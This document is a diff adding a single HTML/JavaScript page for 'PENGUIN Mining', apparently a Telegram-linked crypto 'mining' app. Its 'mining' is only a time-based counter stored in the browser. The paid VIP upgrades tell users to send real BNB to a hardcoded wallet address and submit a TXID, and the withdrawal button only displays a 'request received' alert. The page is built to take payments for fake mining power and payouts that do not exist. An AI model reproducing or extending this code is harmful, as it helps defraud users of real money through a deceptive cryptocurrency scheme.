@@ -1,0 +1,1197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PENGUIN Mining</title>
+
+<style>
+*{
+box-sizing:border-box;
+}
+
+body{
+margin:0;
+background:#080808;
+color:#fff;
+font-family:Arial,sans-serif;
+}
+
+#app{
+min-height:100vh;
+padding-bottom:90px;
+}
+
+.page{
+padding:20px;
+max-width:600px;
+margin:auto;
+}
+
+.header{
+text-align:center;
+padding:25px 0;
+}
+
+.logo{
+font-size:55px;
+}
+
+h1,h2,h3{
+margin:8px 0;
+}
+
+.subtitle,
+.small,
+.info{
+color:#aaa;
+font-size:14px;
+line-height:1.5;
+}
+
+.card{
+background:#111;
+border:1px solid #333;
+border-radius:16px;
+padding:18px;
+margin:14px 0;
+}
+
+.section-title{
+font-weight:bold;
+margin-bottom:10px;
+}
+
+.balance{
+font-size:30px;
+font-weight:bold;
+color:#f5c542;
+margin:10px 0;
+}
+
+.coin{
+color:#aaa;
+}
+
+button{
+width:100%;
+border:0;
+border-radius:12px;
+padding:14px;
+margin-top:10px;
+background:#f5c542;
+color:#111;
+font-weight:bold;
+font-size:15px;
+}
+
+button:disabled{
+opacity:.5;
+}
+
+input{
+width:100%;
+padding:14px;
+margin-top:10px;
+border-radius:10px;
+border:1px solid #444;
+background:#090909;
+color:#fff;
+outline:none;
+}
+
+.address{
+background:#080808;
+border:1px solid #333;
+padding:12px;
+border-radius:10px;
+font-size:12px;
+word-break:break-all;
+margin-top:10px;
+}
+
+.nav{
+position:fixed;
+bottom:0;
+left:0;
+right:0;
+height:75px;
+background:#111;
+border-top:1px solid #333;
+display:flex;
+z-index:10;
+}
+
+.nav button{
+background:transparent;
+color:#aaa;
+margin:0;
+border-radius:0;
+padding:8px 2px;
+font-size:12px;
+}
+
+.nav button span{
+display:block;
+font-size:22px;
+margin-bottom:3px;
+}
+</style>
+</head>
+
+<body>
+
+<div id="app"></div>
+
+
+<script>
+
+const PAYMENT_ADDRESS =
+"0x54990f6F781D81Fc36B76144dfF8637c337062de";
+
+const TELEGRAM_LINK =
+"https://t.me/penguinmining";
+
+const BASE_RATE = 0.0001;
+const MIN_WITHDRAW = 15000;
+
+const VIP_PACKAGES = [
+
+{
+id:1,
+name:"VIP 1",
+price:0.15,
+multiplier:2,
+rate:0.000002
+},
+
+{
+id:2,
+name:"VIP 2",
+price:1,
+multiplier:5,
+rate:0.000005
+},
+
+{
+id:3,
+name:"VIP 3",
+price:2,
+multiplier:10,
+rate:0.000010
+},
+
+{
+id:4,
+name:"VIP 4",
+price:4,
+multiplier:20,
+rate:0.000020
+},
+
+{
+id:5,
+name:"VIP 5",
+price:6,
+multiplier:35,
+rate:0.000035
+},
+
+{
+id:6,
+name:"VIP 6",
+price:10,
+multiplier:60,
+rate:0.000060
+},
+
+{
+id:7,
+name:"VIP 7",
+price:15,
+multiplier:100,
+rate:0.000100
+},
+
+{
+id:8,
+name:"VIP 8",
+price:20,
+multiplier:150,
+rate:0.000150
+}
+
+];
+
+let mining =
+localStorage.getItem("mining") === "true";
+
+let mined =
+parseFloat(localStorage.getItem("mined")) || 0;
+
+let wallet =
+parseFloat(localStorage.getItem("wallet")) || 0;
+
+let lastTime =
+parseInt(localStorage.getItem("lastTime")) || Date.now();
+
+let telegramReward =
+localStorage.getItem("telegramReward") === "true";
+
+let activeVip =
+parseInt(localStorage.getItem("activeVip")) || 0;
+
+let pendingOrder =
+JSON.parse(
+localStorage.getItem("pendingOrder") || "null"
+);
+
+let selectedPackage = null;
+
+
+function saveData(){
+
+localStorage.setItem("mining", mining);
+
+localStorage.setItem("mined", mined);
+
+localStorage.setItem("wallet", wallet);
+
+localStorage.setItem("lastTime", lastTime);
+
+localStorage.setItem(
+"telegramReward",
+telegramReward
+);
+
+localStorage.setItem(
+"activeVip",
+activeVip
+);
+
+localStorage.setItem(
+"pendingOrder",
+JSON.stringify(pendingOrder)
+);
+
+}
+
+
+function getActivePackage(){
+
+return VIP_PACKAGES.find(
+p => p.id === activeVip
+) || null;
+
+}
+
+
+function getRate(){
+
+const pkg = getActivePackage();
+
+return pkg ? pkg.rate : BASE_RATE;
+
+}
+
+
+function updateMining(){
+
+if(!mining){
+
+lastTime = Date.now();
+
+return;
+
+}
+
+const now = Date.now();
+
+const seconds =
+(now - lastTime) / 1000;
+
+if(seconds > 0){
+
+mined += seconds * getRate();
+
+}
+
+lastTime = now;
+
+saveData();
+
+}
+
+
+function startMining(){
+ if(mining) return;
+
+ mining = true;
+ lastTime = Date.now();
+ saveData();
+ showMine();
+
+ setInterval(function(){
+   if(mining){
+     updateMining();
+   }
+},1000);
+
+}
+
+function stopMining(){
+
+updateMining();
+
+mining = false;
+
+saveData();
+
+showMine();
+
+}
+
+
+function claimMining(){
+
+updateMining();
+
+if(mined <= 0){
+
+alert("Claim edilecek PENGUIN yok.");
+
+return;
+
+}
+
+wallet += mined;
+
+mined = 0;
+
+saveData();
+
+showMine();
+
+alert(
+"Mining balance cüzdan bakiyesine aktarıldı."
+);
+
+}
+
+
+function showMine(){
+
+updateMining();
+
+document.getElementById("app").innerHTML = `
+
+<div class="page">
+
+<div class="header">
+
+<div class="logo">
+🐧
+</div>
+
+<h1>
+PENGUIN Mining
+</h1>
+
+<div class="subtitle">
+Mine PENGUIN every second
+</div>
+
+</div>
+
+
+<div class="card">
+
+<div class="section-title">
+⛏️ Mining Balance
+</div>
+
+<div class="balance" id="miningBalance">
+${mined.toFixed(6)}
+</div>
+
+<div class="small">
+Mining rate:
+${getRate()} PENGUIN / sec
+</div>
+
+<button onclick="startMining()">
+Start Mining
+</button>
+
+<button onclick="stopMining()">
+Stop Mining
+</button>
+
+<button onclick="claimMining()">
+Claim Mining
+</button>
+
+</div>
+
+
+<div class="card">
+
+<div class="section-title">
+💰 Wallet Balance
+</div>
+
+<div class="balance">
+${wallet.toFixed(6)}
+</div>
+
+<div class="coin">
+PENGUIN
+</div>
+
+</div>
+
+</div>
+
+`;
+
+}
+
+
+function showTasks(){
+
+document.getElementById("app").innerHTML = `
+
+<div class="page">
+
+<div class="header">
+
+<div class="logo">
+🎯
+</div>
+
+<h1>
+Tasks
+</h1>
+
+<div class="subtitle">
+Complete tasks and earn PENGUIN
+</div>
+
+</div>
+
+
+<div class="card">
+
+<h3>
+Join Penguin Mining
+</h3>
+
+<div class="info">
+
+Join our Telegram channel
+and claim your reward.
+
+</div>
+
+<button onclick="openTelegram()">
+Open Telegram
+</button>
+
+<button onclick="claimTelegramReward()">
+Claim 100 PENGUIN
+</button>
+
+</div>
+
+</div>
+
+`;
+
+}
+
+
+function openTelegram(){
+
+window.open(
+TELEGRAM_LINK,
+"_blank"
+);
+
+}
+
+
+function claimTelegramReward(){
+
+if(telegramReward){
+
+alert(
+"Telegram ödülü daha önce alındı."
+);
+
+return;
+
+}
+
+wallet += 100;
+
+telegramReward = true;
+
+saveData();
+
+alert(
+"100 PENGUIN hesabınıza eklendi."
+);
+
+showTasks();
+
+}
+
+
+function showMiners(){
+
+let html = `
+
+<div class="page">
+
+<div class="header">
+
+<div class="logo">
+⚡
+</div>
+
+<h1>
+Miners
+</h1>
+
+<div class="subtitle">
+Upgrade your mining power
+</div>
+
+</div>
+
+`;
+
+VIP_PACKAGES.forEach(pkg => {
+
+const active =
+activeVip === pkg.id;
+
+html += `
+
+<div class="card">
+
+<h3>
+${pkg.name}
+</h3>
+
+<div>
+Price:
+<strong>${pkg.price} BNB</strong>
+</div>
+
+<div class="small">
+Mining:
+${pkg.rate} PENGUIN / sec
+</div>
+
+<div class="small">
+Multiplier:
+×${pkg.multiplier}
+</div>
+
+<button
+onclick="buyPackage(${pkg.id})"
+${active ? "disabled" : ""}
+>
+
+${active ? "ACTIVE" : "BUY"}
+
+</button>
+
+</div>
+
+`;
+
+});
+
+
+if(pendingOrder){
+
+html += `
+
+<div class="card">
+
+<h3>
+⏳ Pending Order
+</h3>
+
+<div>
+Package:
+${pendingOrder.name}
+</div>
+
+<div>
+Price:
+${pendingOrder.price} BNB
+</div>
+
+<div class="small">
+TXID:
+${pendingOrder.txid}
+</div>
+
+<div class="info">
+
+Siparişiniz alındı.<br>
+Ödeme kontrol ediliyor.<br>
+Onaylanmadan VIP aktifleşmez.
+
+</div>
+
+</div>
+
+`;
+
+}
+
+
+html += `
+
+</div>
+
+`;
+
+document.getElementById("app").innerHTML =
+html;
+
+}
+
+
+function buyPackage(id){
+
+selectedPackage =
+VIP_PACKAGES.find(
+p => p.id === id
+);
+
+if(!selectedPackage){
+
+return;
+
+}
+
+document.getElementById("app").innerHTML = `
+
+<div class="page">
+
+<div class="header">
+
+<div class="logo">
+💰
+</div>
+
+<h1>
+${selectedPackage.name}
+</h1>
+
+<div class="subtitle">
+Payment required
+</div>
+
+</div>
+
+
+<div class="card">
+
+<div class="section-title">
+Package Price
+</div>
+
+<div class="balance">
+${selectedPackage.price} BNB
+</div>
+
+<div class="info">
+
+Send exactly
+${selectedPackage.price} BNB
+to the address below.
+
+</div>
+
+<div class="address">
+
+${PAYMENT_ADDRESS}
+
+</div>
+
+<button onclick="copyPaymentAddress()">
+Copy BNB Address
+</button>
+
+<input
+id="txid"
+type="text"
+placeholder="Enter transaction TXID"
+/>
+
+<button onclick="submitOrder()">
+Submit Purchase
+</button>
+
+<button onclick="showMiners()">
+Back to Miners
+</button>
+
+</div>
+
+</div>
+
+`;
+
+}
+
+
+function copyPaymentAddress(){
+
+navigator.clipboard.writeText(
+PAYMENT_ADDRESS
+)
+.then(function(){
+
+alert(
+"BNB adresi kopyalandı!"
+);
+
+})
+.catch(function(){
+
+alert(
+PAYMENT_ADDRESS
+);
+
+});
+
+}
+
+
+function submitOrder(){
+
+if(!selectedPackage){
+
+alert(
+"Paket seçilmedi."
+);
+
+return;
+
+}
+
+const txid =
+document.getElementById("txid")
+.value
+.trim();
+
+if(!txid){
+
+alert(
+"Lütfen TXID girin."
+);
+
+return;
+
+}
+
+pendingOrder = {
+
+packageId:
+selectedPackage.id,
+
+name:
+selectedPackage.name,
+
+price:
+selectedPackage.price,
+
+multiplier:
+selectedPackage.multiplier,
+
+rate:
+selectedPackage.rate,
+
+txid:
+txid,
+
+status:
+"pending",
+
+createdAt:
+Date.now()
+
+};
+
+saveData();
+
+showOrderSuccess();
+
+}
+
+
+function showOrderSuccess(){
+
+document.getElementById("app").innerHTML = `
+
+<div class="page">
+
+<div class="card">
+
+<div class="logo">
+✅
+</div>
+
+<h2>
+Siparişiniz alındı
+</h2>
+
+<div class="info">
+
+Ödeme kontrol ediliyor.<br><br>
+
+Admin tarafından onaylanmadan
+VIP aktifleşmez.
+
+</div>
+
+<button onclick="showMiners()">
+Back to Miners
+</button>
+
+</div>
+
+</div>
+
+`;
+
+}
+
+
+function showProfile(){
+
+const code =
+generateReferral();
+
+const link =
+"https://t.me/penguinmining?start=" +
+code;
+
+document.getElementById("app").innerHTML = `
+
+<div class="page">
+
+<div class="header">
+
+<div class="logo">
+👤
+</div>
+
+<h1>
+Profile
+</h1>
+
+<div class="subtitle">
+Your PENGUIN account
+</div>
+
+</div>
+
+
+<div class="card">
+
+<div class="section-title">
+💰 Wallet Balance
+</div>
+
+<div class="balance">
+${wallet.toFixed(6)}
+</div>
+
+<div class="coin">
+PENGUIN
+</div>
+
+</div>
+
+
+<div class="card">
+
+<div class="section-title">
+💸 Withdraw
+</div>
+
+<div class="withdraw-limit">
+
+Minimum çekim:
+
+<strong>
+15,000 PENGUIN
+</strong>
+
+</div>
+
+<div class="info">
+
+Enter your BEP20 wallet address
+and withdrawal amount.
+
+</div>
+
+
+<input
+id="withdrawAddress"
+type="text"
+placeholder="BEP20 wallet address"
+/>
+
+
+<input
+id="withdrawAmount"
+type="number"
+placeholder="Amount (Min. 15,000 PENGUIN)"
+min="15000"
+/>
+
+
+<button onclick="requestWithdraw()">
+Request Withdrawal
+</button>
+
+
+<div class="small">
+Minimum withdrawal: 15,000 PENGUIN
+</div>
+
+</div>
+
+
+<div class="card">
+
+<div class="section-title">
+🔗 Referral
+</div>
+
+<div class="info">
+Your referral code:
+</div>
+
+<div class="balance">
+${code}
+</div>
+
+<button onclick="copyReferral()">
+Copy Referral Link
+</button>
+
+</div>
+
+</div>
+
+`;
+
+}
+
+
+function requestWithdraw(){
+
+const address =
+document
+.getElementById("withdrawAddress")
+.value
+.trim();
+
+const amount =
+parseFloat(
+document
+.getElementById("withdrawAmount")
+.value
+);
+
+
+if(!address){
+
+alert(
+"Lütfen BEP20 cüzdan adresinizi girin."
+);
+
+return;
+
+}
+
+
+if(!amount || amount <= 0){
+
+alert(
+"Lütfen çekim miktarını girin."
+);
+
+return;
+
+}
+
+
+if(amount < MIN_WITHDRAW){
+
+alert(
+"Minimum çekim miktarı 15,000 PENGUIN."
+);
+
+return;
+
+}
+
+
+if(amount > wallet){
+
+alert(
+"Yetersiz PENGUIN bakiyesi."
+);
+
+return;
+
+}
+
+
+alert(
+"Çekim talebiniz alındı. Admin kontrolünden sonra işleme alınacaktır."
+);
+
+}
+
+
+function generateReferral(){
+
+let code =
+localStorage.getItem(
+"referralCode"
+);
+
+if(!code){
+
+code =
+Math.random()
+.toString(36)
+.substring(2,8)
+.toUpperCase();
+
+localStorage.setItem(
+"referralCode",
+code
+);
+
+}
+
+return code;
+
+}
+
+
+function copyReferral(){
+
+const code =
+generateReferral();
+
+const link =
+"https://t.me/penguinmining?start=" +
+code;
+
+navigator.clipboard
+.writeText(link)
+.then(function(){
+
+alert(
+"Referral linki kopyalandı!"
+);
+
+})
+.catch(function(){
+
+alert(link);
+
+});
+
+}
+
+
+/* BOTTOM NAV */
+
+function showNav(){
+
+const nav =
+document.createElement("div");
+
+nav.className =
+"nav";
+
+nav.innerHTML = `
+
+<button onclick="showMine()">
+
+<span>⛏️</span>
+
+Mine
+
+</button>
+
+
+<button onclick="showTasks()">
+
+<span>🎯</span>
+
+Tasks
+
+</button>
+
+
+<button onclick="showMiners()">
+
+<span>⚡</span>
+
+Miners
+
+</button>
+
+
+<button onclick="showProfile()">
+
+<span>👤</span>
+
+Profile
+
+</button>
+
+`;
+
+document.body.appendChild(nav);
+
+}
+
+
+setInterval(function(){
+
+updateMining();
+
+const balance = document.getElementById("miningBalance");
+
+if(balance){
+balance.textContent = mined.toFixed(6);
+}
+
+},1000);
+
+showMine();
+
+showNav();
+
+</script>
+
+</body>
+</html>
